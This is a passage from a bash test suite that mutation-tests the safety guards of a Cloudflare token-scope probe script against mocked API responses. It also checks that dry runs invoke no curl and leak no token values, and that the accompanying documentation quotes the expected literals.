assert_eq "MUT Guard 2 dispatch: the settings row sent the empty-items body" 2 "$(m_body_n PATCH '/settings$' '{"items":[]}')"
# shellcheck disable=SC1003  # the trailing backslash is source text: it keeps the next line in the if
run_mut "Guard 2 dispatch: bytes check neutered, a duplicate id key -> the shape check passes it and it is sent" 0 4 2 "probe=zone-rest verdict=pass" \
  "$BYTES_LINE" '  if false \' "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"ssl","id":"cf_token_scope_probe_x","value":"on"}]}')"
assert_eq "MUT Guard 2 dispatch: the duplicate-key body (real setting first) was sent" 2 "$(m_body_n PATCH '/settings$' '{"items":[{"id":"ssl","id":"cf_token_scope_probe_x","value":"on"}]}')"
MUT_ARGS=(--profile zone-rest --dry-run)
run_mut "Guard 2 H2 two compliant items -> dry-run passes" 0 0 0 "cf_token_scope_probe_b" "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"cf_token_scope_probe_a","value":"cf_token_scope_probe_never_valid"},{"id":"cf_token_scope_probe_b","value":"cf_token_scope_probe_never_valid"}]}')"
MUT_ARGS=(--profile zone-rest)
# Guard 3 (collision): dispatch rows prove the check, not the mock, stops the write.
MOCK_ZSET="$ZS_HIT1" run_mut "Guard 3 dispatch: the check reads a never-set variable -> refused as unevaluable, not as a collision" 2 0 2 "verdict=refused reason=settings-list-unevaluable" \
  "$COLL_INPUTS_LINE" "${COLL_INPUTS_LINE/"\"\$1\""/"\"\${MIG_NEVER_SET:-}\""}"
lacks "reason=probe-id-collision" "MUT Guard 3 dispatch: the collision verdict needs the real list"
MOCK_ZSET="$ZS_HIT1" run_mut "Guard 3 removed: a listed probe id would be written to" 0 4 2 "probe=zone-rest verdict=pass" "$COLL_HIT_LINE" '        elif false then "hit"'
MOCK_ZSET='404:{"success":false,"errors":[{"code":7003}]}' run_mut "Guard 3 write-loop gate removed: the JSON body is sent without a cleared list" 3 4 2 "verdict=inconclusive" "$GATE_LINE" '  if false; then'
MIG_SETTINGS_CLEARED=1 MOCK_ZSET='404:{"success":false,"errors":[{"code":7003}]}' run_mut "Guard 3 init removed: an inherited flag opens the row (M11j's mutant)" 3 4 2 "verdict=inconclusive" \
  'MIG_SETTINGS_CLEARED=0' 'MIG_SETTINGS_CLEARED="${MIG_SETTINGS_CLEARED:-0}"  # mutant: inherited'
printf '%s\n' '/zones/[^/]+/settings$|tok-zonesettings-mock|400:{"success":false,"errors":[{"code":6007,"message":"Malformed JSON in request body"}]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" run_mut "Guard 4 the 6007 check removed: a malformed-JSON 400 reads as authorized (M5e's mutant)" 0 4 2 "probe=zone-rest verdict=pass" "$G6007_LINE" '      if false; then'
}
# --- M10: dry-run prints the recipes, sends nothing, keeps tokens unexpanded ---
MCM10="$WORK/m10-curl-marker"; rm -f "$MCM10"
MOCK_CURL_MARKER="$MCM10" run "$MOCKPATH" --profile redirects-dns --dry-run
assert_rc 0 "M10 redirects-dns dry-run -> exit 0"
if [[ ! -e "$MCM10" ]]; then ok "M10 dry-run never invoked curl"; else no "M10 dry-run invoked curl"; fi
has "INVALID_BODY='$INV_BODY'" "M10 dry-run prints the fixed body literal"
# shellcheck disable=SC2016  # the literal, unexpanded variable names are the assertion
has '"$CF_API_TOKEN_PAGES"' "M10 dry-run keeps token variables unexpanded"
lacks "fake-secret-abc123xyz" "M10 dry-run leaks no token value"
has "zones/$NEW_ZONE/rulesets/phases/http_request_dynamic_redirect/entrypoint" "M10 dry-run targets the NEW zone by default"
lacks "SETTINGS_PROBE_BODY=" "M10 redirects-dns dry-run prints no settings probe literal (no settings-json row)"
lacks "# guard:" "M10 redirects-dns dry-run prints no collision-guard line"
rm -f "$MCM10"
MOCK_CURL_MARKER="$MCM10" run "$MOCKPATH" --profile zone-rest --dry-run
assert_rc 0 "M10 zone-rest dry-run -> exit 0"
if [[ ! -e "$MCM10" ]]; then ok "M10 zone-rest dry-run never invoked curl"; else no "M10 zone-rest dry-run invoked curl"; fi
has "INVALID_BODY='$INV_BODY'" "M10 zone-rest dry-run prints INVALID_BODY"
has "SETTINGS_PROBE_BODY='$SET_BODY'" "M10 zone-rest dry-run prints SETTINGS_PROBE_BODY"
has "verdict=refused reason=probe-id-collision, exit 2" "M10 zone-rest dry-run states the collision refusal"
has "verdict=refused reason=settings-list-unevaluable, exit 2" "M10 zone-rest dry-run states the unevaluable refusal"
has "or its list is empty: the settings row is skipped, exit 3" "M10 zone-rest dry-run states the exit-3 skip"
has "lists err 6007 (malformed JSON), reads inconclusive (exit 3)" "M10 zone-rest dry-run previews the 6007 guard"
# Per row: the kind comment, then the printed w_body assignment, then both recipes.
m10_seq() {
  awk -v hdr="$1" -v asg="$2" -v url="$3" '
    found == 0 && index($0, hdr) == 1 { found = 1; n = 0; next }
    found == 1 { n++
      if (n == 1 && $0 != asg) bad = 1
      if ((n == 2 || n == 3) && (index($0, url) == 0 || index($0, "--data-binary \"$w_body\"") == 0)) bad = 1
      if (n == 3) found = 2 }
    END { exit !(found == 2 && !bad) }' "$OUTFILE"
}
# shellcheck disable=SC2016  # the printed, unexpanded assignment is the assertion
if m10_seq '# write zones/<zone>/settings (body-kind settings-json)' 'w_body="$SETTINGS_PROBE_BODY"' "zones/$NEW_ZONE/settings"; then
  ok "M10 the settings recipes follow (body-kind settings-json) and w_body=\"\$SETTINGS_PROBE_BODY\""
else
  no "M10 settings recipe block wrong (see $OUTFILE)"
fi
# shellcheck disable=SC2016  # the printed, unexpanded assignment is the assertion
if m10_seq '# write zones/<zone>/bot_management (body-kind invalid)' 'w_body="$INVALID_BODY"' "zones/$NEW_ZONE/bot_management"; then
  ok "M10 the bot_management recipes follow (body-kind invalid) and w_body=\"\$INVALID_BODY\""
else
  no "M10 bot_management recipe block wrong (see $OUTFILE)"
fi
for leak in tok-zonesettings-mock tok-botmgmt-mock; do lacks "$leak" "M10 zone-rest dry-run leaks no token $leak"; done

# --- D-doc: SKILL.md / playbook documentation pins (AC7) ---
d_has() { if grep -qF -- "$1" "$2"; then ok "$3"; else no "$3 (missing: $1 in $2)"; fi }
d_has '--profile default-token' "$SKILLDOC" "D-doc SKILL.md documents the profile flag"
d_has '--expect-lb-scopes' "$SKILLDOC" "D-doc SKILL.md documents the assert flag"
d_has 'not-yet-widened' "$SKILLDOC" "D-doc SKILL.md documents the neutral state"
d_has 'profiles only' "$SKILLDOC" "D-doc SKILL.md re-words the posture (profiles only, no raw token-var knob)"
# The documented NOTE literal must EQUAL the minted one (fix-round seats: the
# "stable grep target" claim was otherwise unpinned; D2o pins the mint, this
# pins the doc).
d_has 'NOTE: LB scope not-yet-widened — expected BEFORE the #11181 widen; re-run with --expect-lb-scopes after it' "$SKILLDOC" "D-doc SKILL.md quotes the NOTE literal verbatim"
d_has '--profile default-token --expect-lb-scopes' "$PLAYBOOK" "D-doc playbook carries the post-widen pointer"
d_has 'accounts/<acct>/alerting/v3/policies' "$SKILLDOC" "D-doc SKILL.md documents the official Notifications route"
if grep -qF -- 'accounts/<acct>/notification_policies' "$SKILLDOC"; then no "D-doc SKILL.md retains the legacy Notifications route"; else ok "D-doc SKILL.md has no legacy Notifications route"; fi

# --- U1: no SUT run in this suite sent a curl flag the mock does not model (D12c U). ---
if [[ -f "$MOCK_CURL_UNMODELLED" && ! -s "$MOCK_CURL_UNMODELLED" ]]; then
  ok "U1 no run in this suite sent a curl flag the mock does not model"
else
  no "U1 unmodelled curl flags reached the mock: $(cat "$MOCK_CURL_UNMODELLED" 2>/dev/null)"
fi

printf '\n%d passed, %d failed\n' "$pass" "$fail"
MIN_ASSERTIONS=681
if [[ "$((pass + fail))" -lt "$MIN_ASSERTIONS" ]]; then
  printf 'ANTI-VACUITY FLOOR: only %s assertions ran, floor is %s\n' "$((pass + fail))" "$MIN_ASSERTIONS" >&2
  exit 1
fi
[[ "$fail" -eq 0 ]]
